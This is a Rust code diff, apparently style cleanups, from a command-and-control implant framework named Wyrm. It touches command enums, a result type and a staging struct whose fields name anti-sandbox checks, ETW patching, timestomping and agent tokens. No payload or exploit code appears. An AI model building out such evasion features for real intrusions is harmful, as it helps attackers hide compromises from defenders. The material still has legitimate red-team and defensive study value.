@@ -7,7 +7,7 @@ use std::{
     path::PathBuf,
 };
 
-use crate::task_types::{BuildAllBins, FileCopyInner, RegAddInner, RegQueryInner};
+use crate::task_types::{FileCopyInner, RegAddInner, RegQueryInner};
 
 /// Commands supported by the implant and C2.
 ///
@@ -15,7 +15,7 @@ use crate::task_types::{BuildAllBins, FileCopyInner, RegAddInner, RegQueryInner}
 ///
 /// # Safety
 /// We are using 'C' style enums to avoid needing serde to ser/deser types through the network.
-/// When interpreting a command integer, it **MUST** in all cases, be interpreted by [std::mem::transmute]
+/// When interpreting a command integer, it **MUST** in all cases, be interpreted by [`std::mem::transmute`]
 /// as a `u32`, otherwise you risk UB.
 #[repr(u32)]
 #[derive(Serialize, Deserialize, Copy, Clone, PartialEq, Eq)]
@@ -111,7 +111,7 @@ impl From<&str> for FileDropMetadata {
         // around the ordering and content of contained data.
         //
 
-        let parts: Vec<&str> = value.split(",").collect();
+        let parts: Vec<&str> = value.split(',').collect();
 
         assert_eq!(parts.len(), 3);
 
@@ -312,6 +312,10 @@ impl<T: Serialize> Default for WyrmResult<T> {
 }
 
 impl<T: Serialize> WyrmResult<T> {
+    /// Unwraps a wyrm result.
+    ///
+    /// # Panics
+    /// This function will panic with no output error (OPSEC) if unwrap failed.
     pub fn unwrap(self) -> T {
         match self {
             WyrmResult::Ok(x) => x,
@@ -371,21 +375,21 @@ pub struct NewAgentStaging {
 }
 
 impl NewAgentStaging {
-    pub fn from_staged_file_metadata(staging_endpoint: &String, download_name: &String) -> Self {
+    pub fn from_staged_file_metadata(staging_endpoint: &str, download_name: &str) -> Self {
         NewAgentStaging {
             implant_name: "-".into(),
             default_sleep_time: 0,
             c2_address: "-".into(),
             c2_endpoints: vec!["-".into()],
-            staging_endpoint: staging_endpoint.clone(),
-            pe_name: download_name.clone(),
+            staging_endpoint: staging_endpoint.to_owned(),
+            pe_name: download_name.to_owned(),
             port: 1,
             agent_security_token: "-".into(),
             antisandbox_trig: false,
             antisandbox_ram: false,
             stage_type: StageType::Exe,
             build_debug: false,
-            useragent: "".into(),
+            useragent: String::new(),
             patch_etw: false,
             jitter: None,
             timestomp: None,
